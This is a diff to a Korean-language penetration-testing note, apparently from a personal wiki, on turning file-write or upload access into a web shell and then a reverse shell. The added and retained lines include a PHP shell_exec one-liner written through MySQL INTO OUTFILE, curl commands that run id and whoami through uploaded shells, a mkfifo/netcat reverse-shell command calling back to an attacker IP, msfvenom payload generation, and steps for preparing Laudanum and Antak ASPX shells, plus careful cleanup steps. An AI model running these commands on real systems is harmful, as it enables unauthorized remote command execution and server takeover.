@@ -39,6 +39,15 @@ tags:
 4. `id`/`whoami` 같은 저위험 명령으로 실행 여부를 검증한다.
 5. 필요하면 [[Reverse Shell 획득]]으로 전환한다.
 
+공격 호스트에서는 업로드할 proof·Web Shell·생성 payload를 다른 작업 파일과 섞지 않도록 작업 전 없던 고유 directory를 만든다. `test`가 실패하면 기존 경로를 재사용하지 않는다.
+
+```bash
+test ! -e '<WEBSHELL_WORKDIR>'
+install -d -m 700 -- '<WEBSHELL_WORKDIR>'
+printf 'web-upload-proof-<UNIQUE_ID>\n' > '<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>'
+sha256sum -- '<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>'
+```
+
 ### 파일 쓰기 출처별 시작점
 
 | 현재 확인한 파일 쓰기 경로 | 이 문서에서 먼저 확인할 조건 | 다음 실행 |
@@ -49,7 +58,7 @@ tags:
 | MySQL `FILE` 권한과 웹 루트 쓰기 | `secure_file_priv`, DB 서비스 계정의 OS 쓰기 권한, HTTP로 제공되는 실제 경로 | 고유 Web Shell 파일을 기록한 뒤 HTTP 명령 출력 확인 |
 | Oracle `UTL_FILE`과 웹 노출 directory | Oracle directory 쓰기, HTTP로 제공되는 실제 경로, 서버 스크립트 handler | [[Oracle TNS 서비스#선택적 UTL_FILE 텍스트 쓰기 proof\|Oracle UTL_FILE 텍스트 쓰기 검증]]에서 텍스트 파일 쓰기와 조회를 확인한 뒤 Web Shell 파일로 전환 |
 
-파일 쓰기 성공은 Web Shell 실행 성공이 아니다. 각 선행 문서에서 고유 텍스트 파일의 생성과 HTTP 조회를 먼저 확인한 뒤, 이 문서에서 서버 측 handler와 명령 출력을 검증한다.
+파일 쓰기 성공은 Web Shell 실행 성공이 아니다. 각 선행 문서에서 고유 텍스트 파일의 생성과 HTTP 조회를 먼저 확인한 뒤, 이 문서에서 서버 측 handler와 명령 출력을 검증한다. DB에서 시작한 경우 login·engine OS Identity·server path·정적 제공·handler의 단계는 [[DB 서버 측 작업의 실행 주체와 결과 경계]]를 따른다.
 
 ### 명령과 확인할 출력
 
@@ -83,20 +92,24 @@ ASP:
 #### 업로드 확인
 
 ```bash
-curl -F "file=@proof.txt" http://<TARGET>/upload
-curl http://<TARGET>/uploads/proof.txt
+curl -i "http://<TARGET>/uploads/<UNIQUE_PROOF>"
+curl -F "file=@<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>" http://<TARGET>/upload
+curl "http://<TARGET>/uploads/<UNIQUE_PROOF>"
 ```
 
 확인할 출력:
 
-- 업로드 성공 응답과 파일 내용 조회.
+- 첫 요청의 기준 404·파일 부재 응답, 업로드 성공 응답과 이후 고유 proof 내용 조회. 첫 요청에서 같은 파일이 이미 보이면 새 이름을 선택한다.
 
 #### Web Shell 호출
 
+업로드 전에 사용할 exact URL이 기준 오류 응답을 반환하는지 확인한다. 같은 이름의 기존 resource가 보이거나 기준 응답과 구분할 수 없으면 다른 고유 이름·경로를 선택한다.
+
 ```bash
-curl "http://<TARGET>/uploads/shell.php?cmd=id"
-curl "http://<TARGET>/uploads/shell.aspx?cmd=whoami"
-curl -G "http://<TARGET>/uploads/shell.php" --data-urlencode "cmd=whoami"
+curl -i "http://<TARGET>/uploads/<UNIQUE_SHELL>.<EXT>"
+curl "http://<TARGET>/uploads/<UNIQUE_SHELL>.php?cmd=id"
+curl "http://<TARGET>/uploads/<UNIQUE_SHELL>.aspx?cmd=whoami"
+curl -G "http://<TARGET>/uploads/<UNIQUE_SHELL>.php" --data-urlencode "cmd=whoami"
 ```
 
 확인할 출력:
@@ -106,7 +119,7 @@ curl -G "http://<TARGET>/uploads/shell.php" --data-urlencode "cmd=whoami"
 
 #### MySQL 파일 쓰기에서 Web Shell로 전환
 
-MySQL의 `FILE` 권한, `secure_file_priv` 허용 경로, DB 서비스 계정의 웹 루트 쓰기 권한과 실제 HTTP 경로가 모두 확인된 경우에만 실행한다.
+[[DB 서버 파일 쓰기 검증]]에서 MySQL의 `FILE` 권한, `secure_file_priv` 허용 경로, DB 서비스 계정의 웹 루트 쓰기 권한과 실제 HTTP 경로가 모두 확인된 경우에만 실행한다.
 
 ```sql
 SELECT '<?php echo shell_exec($_GET["c"]);?>' INTO OUTFILE '/var/www/html/<UNIQUE_SHELL>.php';
@@ -123,46 +136,58 @@ curl -G "http://<TARGET>/<UNIQUE_SHELL>.php" --data-urlencode "c=id"
 
 #### Web Shell에서 reverse shell 전환
 
-공격자 호스트에서 listener를 먼저 연다.
+공격자 호스트에서 같은 포트의 기존 listener가 없는지 확인하고 전용 terminal에서 listener를 먼저 연다.
 
 ```bash
-nc -lvnp 9443
+ss -ltnp 'sport = :<LISTEN_PORT>'
+nc -lvnp <LISTEN_PORT>
 ```
+
+다른 공격자 terminal에서 `ss -ltnp 'sport = :<LISTEN_PORT>'`로 새 `<LISTENER_PID>`와 command line을 기록한다. 기존 listener가 있으면 다른 포트를 고른다.
 
 Web Shell을 호출해 연결 명령을 실행한다.
 
 ```bash
-curl -G "http://<TARGET>/uploads/shell.php" --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 9443 >/tmp/f"
+curl -G "http://<TARGET>/uploads/<UNIQUE_SHELL>.php" --data-urlencode "cmd=test ! -e '<REMOTE_FIFO>' && mkfifo '<REMOTE_FIFO>' && cat '<REMOTE_FIFO>'|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LISTEN_PORT> >'<REMOTE_FIFO>'"
 ```
 
 확인할 출력:
 
 - HTTP 응답이 비어 있어도 listener에 대상 연결과 셸 출력이 들어오면 세션 전환 성공이다.
 - 연결 후 `id`, `hostname`, `pwd`로 웹 요청을 처리한 호스트와 실행 계정을 다시 확인한다.
+- callback이 없으면 `<REMOTE_FIFO>` 기존 존재, `mkfifo`·`nc` 사용 가능 여부, egress와 listener bind를 차례로 확인한다. 고유 FIFO의 사전 부재를 확인하지 못했다면 기존 경로를 삭제하지 않는다.
 
 #### 준비된 ASPX Web Shell 사용
+
+Laudanum과 Antak의 system-wide 원본은 직접 수정하지 않는다. 설치 경로는 배포판 package에 따라 다를 수 있으므로 실제 source file을 확인하고 고유 작업 directory로 복사한다. 다음 두 분기는 대안이며 같은 `<UNIQUE_SHELL>.aspx` 경로에 차례로 실행하지 않는다.
 
 Laudanum:
 
 ```bash
-cp /usr/share/laudanum/aspx/shell.aspx ~/webshells/demo.aspx
+test -f '<LAUDANUM_SOURCE>/aspx/shell.aspx'
+cp -- '<LAUDANUM_SOURCE>/aspx/shell.aspx' '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.aspx'
+sha256sum -- '<LAUDANUM_SOURCE>/aspx/shell.aspx' '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.aspx'
 ```
 
-- 업로드 전에 파일 내부의 허용 IP, 콜백 IP·포트와 인증 관련 값을 현재 대상 경로에 맞게 수정한다.
+- 업로드 전에 작업 사본 내부의 허용 IP, 콜백 IP·포트와 인증 관련 값을 현재 대상 경로에 맞게 수정한다. 수정 뒤 hash가 원본과 달라졌는지와 허용할 주소가 실제 공격 호스트인지 확인한다.
 
 Nishang Antak:
 
 ```bash
-cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/webshells/
+test -f '<NISHANG_SOURCE>/Antak-WebShell/antak.aspx'
+cp -- '<NISHANG_SOURCE>/Antak-WebShell/antak.aspx' '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.aspx'
+sha256sum -- '<NISHANG_SOURCE>/Antak-WebShell/antak.aspx' '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.aspx'
 ```
 
 - ASP.NET 환경에서 PowerShell 콘솔 형태가 필요할 때 사용한다.
 - 업로드 전 파일 내부의 고정 자격 증명과 불필요한 주석·표시 문자열을 제거한다.
+- Antak은 각 명령을 새 process에서 실행하므로 `cd` 같은 session 상태가 다음 명령에 유지된다고 가정하지 않는다. 필요한 경로를 절대 경로로 쓰거나 한 요청 안의 명령으로 연결한다.
 
 #### payload 생성 후보
 
 ```bash
-msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o shell.php
+msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LISTEN_PORT> -f raw -o '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.php'
+sha256sum -- '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.php'
 ```
 
 확인할 출력:
@@ -187,21 +212,37 @@ msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o shell.php
 
 ## 변경 영향과 복구
 
-업로드한 proof, Web Shell과 생성한 FIFO를 정확한 경로로 제거한다. 애플리케이션 삭제 기능이 있으면 해당 기능을 우선하고, 확보한 셸을 사용한다면 Web Shell을 마지막에 제거한다.
+업로드한 proof, Web Shell과 생성한 FIFO를 정확한 경로로 제거한다. 애플리케이션 삭제 기능이 있으면 해당 기능을 우선하고, 확보한 셸을 사용한다면 원격 후속 정리를 끝낸 뒤 Web Shell을 마지막에 제거한다. `<REMOTE_FIFO>`는 이 작업 전 부재와 exact 경로를 확인한 경우에만 제거한다.
 
 ```bash
-rm -f -- /tmp/f
-rm -f -- <WEB_ROOT>/<UNIQUE_PROOF> <WEB_ROOT>/<UNIQUE_SHELL>
+rm -f -- '<REMOTE_FIFO>'
+rm -f -- '<WEB_ROOT>/<UNIQUE_PROOF>' '<WEB_ROOT>/<UNIQUE_SHELL>.<EXT>'
 ```
 
 Windows:
 
 ```cmd
 del /f /q "<WEB_ROOT>\<UNIQUE_PROOF>"
-del /f /q "<WEB_ROOT>\<UNIQUE_SHELL>"
+del /f /q "<WEB_ROOT>\<UNIQUE_SHELL>.<EXT>"
 ```
 
 삭제 후 업로드 URL이 더 이상 파일을 반환하지 않는지 확인한다. 서버 측 삭제 경로가 없다면 실행 파일 업로드 전에 고유 proof 삭제 가능 여부부터 확인한다.
+
+원격 정리를 확인한 뒤 reverse shell을 종료하고 공격 호스트의 listener terminal에서 `Ctrl+C`를 입력한다. 기록한 PID·포트가 남아 있을 때만 command line을 다시 대조한 exact PID를 종료한다. 이름으로 모든 `nc` process를 종료하지 않는다.
+
+```bash
+ps -p <LISTENER_PID> -o pid=,lstart=,args=
+ss -ltnp 'sport = :<LISTEN_PORT>'
+kill <LISTENER_PID>
+ps -p <LISTENER_PID> -o pid=,args=
+ss -ltnp 'sport = :<LISTEN_PORT>'
+find '<WEBSHELL_WORKDIR>' -maxdepth 1 -type f -printf '%p %s bytes\n'
+rm -f -- '<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>' '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.<EXT>'
+rmdir -- '<WEBSHELL_WORKDIR>'
+test ! -e '<WEBSHELL_WORKDIR>'
+```
+
+`Ctrl+C`로 listener가 이미 끝났다면 `kill`은 실행하지 않는다. `find` 결과에 예상하지 않은 파일이 있으면 directory를 일괄 삭제하지 않고 이번 작업의 exact 파일만 처리한다. 원격 URL 부재, `<REMOTE_FIFO>` 부재, 기록한 listener 부재와 local 작업 directory 부재를 각각 확인해야 이번 작업 자원 정리가 완료다. 원격 연결이 끊겨 파일·FIFO를 확인하지 못하면 local 자원만 정리하고 전체 복구 완료로 표시하지 않는다.
 
 ## 후속 공격 연결
 
@@ -223,3 +264,8 @@ del /f /q "<WEB_ROOT>\<UNIQUE_SHELL>"
 
 - [[curl]]
 - [[msfvenom]]
+
+## 참고 링크
+
+- [Laudanum source repository](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
+- [Nishang Antak-WebShell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
